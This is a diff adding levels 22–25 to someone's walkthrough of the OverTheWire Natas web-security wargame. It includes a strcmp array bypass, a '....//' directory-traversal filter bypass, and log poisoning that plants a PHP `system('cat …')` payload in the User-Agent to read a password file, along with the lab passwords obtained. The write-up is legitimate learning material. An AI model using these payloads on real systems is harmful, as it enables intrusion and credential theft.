@@ -564,4 +564,96 @@ Username: natas22
 URL:      http://natas22.natas.labs.overthewire.org
 ```
 
+This one was pretty simple.  All you need to do is pass `?revelio` into the URL. However it auto-redirects and doesn't show the password, so I used the curl command: `curl -i -u natas22:91awVM9oDiUGm33JdzM7RVLBS8bz9n0s http://natas22.natas.labs.overthewire.org/\?revelio`
+
+```
+You are an admin. The credentials for the next level are:<br><pre>Username: natas23
+Password: qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj</pre>
+```
+
+# 23
+
+```
+Username: natas23
+URL:      http://natas23.natas.labs.overthewire.org
+```
+
+This is also pretty simple, it just checks if the given password has `iloveyou` anywhere on the string, and is atleast 10 characters. I just used `1111iloveyou`.
+
+```
+The credentials for the next level are:
+
+Username: natas24 Password: 0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r
+```
+
+# 24
+
+```
+Username: natas24
+URL:      http://natas24.natas.labs.overthewire.org
+```
+
+This website uses `strcmp()` to see if a password is the same as the actual password string, however it is censored. Apparantly this function is kinda broken in PHP because it returns true if you pass in a non-string as a password. So i passed in an empty array by doing `?passwd[]`.
+
+```
+The credentials for the next level are:
+
+Username: natas25 Password: O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx
+```
+
+# 25
+
+```
+Username: natas25
+URL:      http://natas25.natas.labs.overthewire.org
+```
+
+The website shows a quote, and a selection of two langauges that switches the text. Looking at the source code, the `lang` variable that contains the language is returning the file which contains the quotes. It's on a fixed directory which we don't know the location, so we have to directory traverse to find the password.
+
+However, there's also this function called `safeinclude($filename)`, which does two things:
+
+1. removes all instances of `../`. Luckily it does this only once so we can bypass this by doing `....//`.
+
+2. stops from running any further if it contains `natas_webpass`, so we can't access the file directly.
+
+That was when I found another function:
+
+> ```php
+>     function logRequest($message){
+>         $log="[". date("d.m.Y H::i:s",time()) ."]";
+>         $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
+>         $log=$log . " \"" . $message ."\"\n"; 
+>         $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
+>         fwrite($fd,$log);
+>         fclose($fd);
+>     }
+> ```
+
+This creates a file based on my session id, which is stored in our PHPSESSID cookie (MIne is `vanjddmfn2t60ii6m4faoov3bq`). We can access it by doing `?lang=....//....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_vanjddmfn2t60ii6m4faoov3bq.log` 
+
+Another thing about this log is that it parses our user agent for some reason. We can put PHP code on our user agent and it will run. So using an user agent editor such as [this](https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher/) will help us change our user agent to `<?php system('cat /etc/natas_webpass/natas26'); ?>`.  
+
+After changing our user agent and accessing the log file, we get our password in the HTML source.
+
+```
+[29.12.2023 04::25:03] 8A506rfIAXbKKk68yJeuTuRq4UfcK70k
+```
+
+# 26
+
+```
+Username: natas26
+URL:      http://natas26.natas.labs.overthewire.org
+```
+
+
+
+ 
+
+
+
+
+
+
+
 
